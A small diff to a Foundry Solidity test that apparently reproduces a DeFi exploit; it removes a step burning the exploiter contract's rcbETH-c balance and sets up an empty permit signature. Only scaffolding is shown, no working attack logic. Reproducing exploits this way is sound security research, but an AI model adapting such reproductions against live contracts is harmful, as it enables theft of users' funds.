@@ -147,10 +147,6 @@ contract ContractTest is Test {
 
         console.log("storedIndex magnification factor", storedindex2 / storedindex1);
 
-        vm.startPrank(address(PRM));
-        rcbETH_c.burn(address(expContract), rcbETH_c.balanceOf(address(expContract))); // burn all exploiter's rcbETH-c to ensure that all rcbETH-c belongs to this contract
-        vm.stopPrank();
-
         IPRM.ERC20PermitSignature memory ERC20PermitSignature =
             IPRM.ERC20PermitSignature(address(0), uint256(0), uint256(0), uint8(0), bytes32(0), bytes32(0));
 
